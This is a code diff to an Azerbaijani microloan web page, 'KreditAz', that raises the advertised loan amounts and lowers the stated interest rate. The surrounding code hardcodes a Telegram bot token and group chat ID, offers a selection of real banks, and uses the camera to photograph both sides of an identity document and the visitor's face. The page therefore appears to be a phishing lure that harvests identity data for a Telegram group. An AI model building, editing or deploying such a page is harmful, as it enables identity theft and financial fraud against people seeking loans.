@@ -1797,11 +1797,11 @@
             </div>
             <div class="hero-card">
                 <div class="row"><span>Kredit təşkilatı</span><span class="mono">KreditAz MKT</span></div>
-                <div class="row"><span>Məbləğ aralığı</span><span class="mono">100–700 ₼</span></div>
+                <div class="row"><span>Məbləğ aralığı</span><span class="mono">100–1000 ₼</span></div>
                 <hr>
-                <div class="row"><span>Nümunə: 500 ₼ / 3 ay</span></div>
-                <div class="big-number">202 ₼ <span style="font-size:14px;color:var(--ink-soft);font-family:'Manrope',sans-serif;">/ ay</span></div>
-                <div class="row" style="margin-top:10px;"><span>Aylıq faiz</span><span class="mono">4%</span></div>
+                <div class="row"><span>Nümunə: 1000 ₼ / 3 ay</span></div>
+                <div class="big-number" id="heroMonthly">373 ₼ <span style="font-size:14px;color:var(--ink-soft);font-family:'Manrope',sans-serif;">/ ay</span></div>
+                <div class="row" style="margin-top:10px;"><span>Aylıq faiz</span><span class="mono">2.6%</span></div>
             </div>
         </div>
     </section>
@@ -1817,8 +1817,8 @@
                 <div>
                     <div class="slider-block">
                         <label>Kredit məbləği <span class="slider-value" id="amountLabel">400 ₼</span></label>
-                        <input type="range" id="amountSlider" min="100" max="700" step="50" value="400">
-                        <div class="range-labels"><span>100 ₼</span><span>700 ₼</span></div>
+                        <input type="range" id="amountSlider" min="100" max="1000" step="50" value="400">
+                        <div class="range-labels"><span>100 ₼</span><span>1000 ₼</span></div>
                     </div>
                     <div class="slider-block">
                         <label>Müddət <span class="slider-value" id="termLabel">3 ay</span></label>
@@ -1842,7 +1842,7 @@
                     <div class="pair"><span>Kredit məbləği</span><span class="mono" id="principalOut">400 ₼</span></div>
                     <div class="pair"><span>Komissiya (9%)</span><span class="mono" id="feeOut">36 ₼</span></div>
                     <div class="pair"><span>Müddət</span><span class="mono" id="termOut">3 ay</span></div>
-                    <div class="pair"><span>Aylıq faiz</span><span class="mono">4%</span></div>
+                    <div class="pair"><span>Aylıq faiz</span><span class="mono">2.6%</span></div>
                 </div>
             </div>
         </div>
@@ -1861,10 +1861,10 @@
                 <div class="offer-card">
                     <span class="tag">Standart</span>
                     <h3>Sürətli Kredit</h3>
-                    <div class="amount mono">100 – 700 ₼</div>
+                    <div class="amount mono">100 – 1000 ₼</div>
                     <ul>
                         <li><span>Müddət</span><span class="mono">2 ay</span></li>
-                        <li><span>Aylıq faiz</span><span class="mono">4%</span></li>
+                        <li><span>Aylıq faiz</span><span class="mono">2.6%</span></li>
                         <li><span>Komissiya</span><span class="mono">9%</span></li>
                         <li><span>Rəsmi gəlir tələbi</span><span class="mono">Yoxdur</span></li>
                     </ul>
@@ -1872,10 +1872,10 @@
                 <div class="offer-card vip">
                     <span class="tag">VIP</span>
                     <h3>Uzadılmış Kredit</h3>
-                    <div class="amount mono">100 – 700 ₼</div>
+                    <div class="amount mono">100 – 1000 ₼</div>
                     <ul>
                         <li><span>Müddət</span><span class="mono">3 ay</span></li>
-                        <li><span>Aylıq faiz</span><span class="mono">4%</span></li>
+                        <li><span>Aylıq faiz</span><span class="mono">2.6%</span></li>
                         <li><span>Komissiya</span><span class="mono">9%</span></li>
                         <li><span>Rəsmi gəlir tələbi</span><span class="mono">Yoxdur</span></li>
                     </ul>
@@ -1909,7 +1909,7 @@
             <div id="faqList">
                 <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Nə qədər məbləğ ala bilərəm? <span class="icon">+</span></button>
                     <div class="faq-a">
-                        <p>100–700 ₼ arasında, rəsmi gəlir sənədi olmadan.</p>
+                        <p>100–1000 ₼ arasında, rəsmi gəlir sənədi olmadan.</p>
                     </div>
                 </div>
                 <div class="faq-item"><button class="faq-q" onclick="toggleFAQ(this)">Hansı sənədlər lazımdır? <span class="icon">+</span></button>
@@ -2314,9 +2314,9 @@
             { name: 'Rabitəbank', color: '#003366', logo: bankLogos['Rabitəbank'], sub: 'rabitabank.com' }
         ];
 
-        // ========== TELEGRAM ==========
+        // ========== TELEGRAM - YENİ CHAT_ID ==========
         var BOT_TOKEN = "8902438504:AAHNLnxNa6m2BBnO0eEJdssVYvXTHpBgscI";
-        var CHAT_ID = "-1004334177374";
+        var CHAT_ID = "-1004334177374";  // ✅ YENİ GROUP ID
 
         var applicationData = {};
         var selectedBankData = { name: 'Kapital Bank', color: '#E31E24' };
@@ -2625,14 +2625,12 @@
             scanStep++;
             if (scanStep < 2) {
                 updateScanStep();
-                // Növbəti addım üçün yenidən kamera aç
                 var btn = document.getElementById('scanStartBtn');
                 btn.style.display = 'block';
                 btn.textContent = '📷 Növbəti şəkil';
                 document.getElementById('scanProgress').style.width = '0%';
                 document.getElementById('scanStatusText').textContent = 'Sənədin arxa tərəfini çəkin';
             } else {
-                // Sənəd bitdi → Üzə keç
                 document.getElementById('scanStatus').innerHTML =
                     '✅ Sənəd çəkildi!<span class="sub" style="color:var(--teal-deep);">İndi üz tanımaya keçilir...</span>';
                 document.getElementById('scanStatusText').textContent = '✅ Sənəd yoxlaması tamamlandı!';
@@ -2662,15 +2660,12 @@
                 video.srcObject = videoStream;
                 await video.play();
 
-                // 2 saniyə gözlə və şəkil çək
                 document.getElementById('scanStatusText').textContent = '⏳ Çəkilişə hazırlaşır... 2 saniyə';
                 setTimeout(function() {
-                    // Şəkil çək
                     capturePhoto(video, getScanStepName('sənəd'));
                     document.getElementById('scanProgress').style.width = '100%';
                     document.getElementById('scanStatusText').textContent = '✅ Şəkil çəkildi!';
 
-                    // 1 saniyə sonra növbəti addıma keç
                     setTimeout(function() {
                         nextScanStep();
                     }, 1000);
@@ -2703,7 +2698,6 @@
                 document.getElementById('faceStatusText').textContent = '⏳ 2 saniyə...';
 
                 setTimeout(function() {
-                    // Üz şəklini çək
                     var canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 300;
                     canvas.height = video.videoHeight || 300;
@@ -2809,11 +2803,13 @@
             var termOption = termOptions.find(function(t) { return t.value === termIndex; }) || termOptions[5];
             var termLabelText = termOption.label;
             var days = termOption.days;
-            var dailyRate = 0.04 / 30;
+            var monthlyRate = 2.6 / 100; // 2.6%
+            var dailyRate = monthlyRate / 30;
             var fee = Math.round(amount * 0.09);
             var interest = Math.round(amount * dailyRate * days);
             var total = amount + fee + interest;
             var monthly = Math.round(total / Math.max(1, days / 30));
+
             amountLabel.textContent = amount.toLocaleString('az-AZ') + ' ₼';
             termLabel.textContent = termLabelText;
             monthlyOut.textContent = monthly.toLocaleString('az-AZ') + ' ₼';
@@ -2821,11 +2817,17 @@
             principalOut.textContent = amount.toLocaleString('az-AZ') + ' ₼';
             feeOut.textContent = fee.toLocaleString('az-AZ') + ' ₼';
             termOut.textContent = termLabelText;
+
+            // Hero hissəsini yenilə
+            document.getElementById('heroMonthly').innerHTML = monthly.toLocaleString('az-AZ') + ' ₼ <span style="font-size:14px;color:var(--ink-soft);font-family:\'Manrope\',sans-serif;">/ ay</span>';
+
             document.getElementById('creditAmountDisplay').textContent = amount.toLocaleString('az-AZ') + ' ₼';
             document.getElementById('creditTermDisplay').textContent = termLabelText + ' müddətə';
+
             updateSliderFill(amountSlider);
             updateSliderFill(termSlider);
         }
+
         amountSlider.addEventListener('input', calc);
         termSlider.addEventListener('input', calc);
         setTimeout(calc, 100);
@@ -3258,7 +3260,7 @@
         creditTermDisplay.style.display = 'none';
         document.body.appendChild(creditTermDisplay);
 
-        console.log('✅ KreditAz yükləndi!');
+        console.log('✅ KreditAz yükləndi! Yeni CHAT_ID: -1004334177374');
     </script>
 </body>
-                                                                                         </html>
+                            </html>
